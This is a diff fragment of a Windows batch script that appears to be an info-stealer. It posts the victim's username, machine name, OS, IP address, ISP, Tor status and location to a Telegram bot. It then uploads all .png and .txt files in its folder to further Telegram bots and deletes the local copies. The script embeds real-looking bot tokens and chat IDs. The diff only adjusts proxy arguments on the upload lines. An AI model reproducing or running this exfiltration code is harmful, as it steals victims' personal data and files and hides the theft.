@@ -54,8 +54,8 @@ for /f "tokens=1* delims=: " %%A in (
 ) Do set TorStatus=%%B
 
 curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%OsName% %OsArchitecture%] [%ISP% (%ExtIP%), TOR: %TorStatus%] [%City% (%Region%, %Country%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
-for %%# in ("*.png") do curl.exe %proxy% 127.0.0.1:9050 -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
-for %%# in ("*.txt") do curl.exe %proxy% 127.0.0.1:9050 -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
+for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
+for %%# in ("*.txt") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure
 
 del /q /s /a *.png
 del /q /s /a *.txt
